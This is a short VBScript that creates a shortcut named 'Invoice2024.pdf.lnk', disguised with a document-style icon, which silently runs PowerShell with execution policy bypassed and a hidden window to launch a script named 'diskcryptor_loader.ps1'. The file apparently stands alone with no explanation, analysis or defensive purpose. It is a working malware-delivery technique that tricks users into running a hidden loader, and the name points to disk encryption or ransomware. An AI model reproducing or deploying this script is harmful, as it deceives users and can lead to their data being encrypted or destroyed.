
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\Users\Public\Documents\Invoice2024.pdf.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "powershell.exe"
oLink.Arguments = "-windowstyle hidden -ExecutionPolicy Bypass -File diskcryptor_loader.ps1"
oLink.IconLocation = "C:\Windows\System32\shell32.dll,13"
oLink.Save
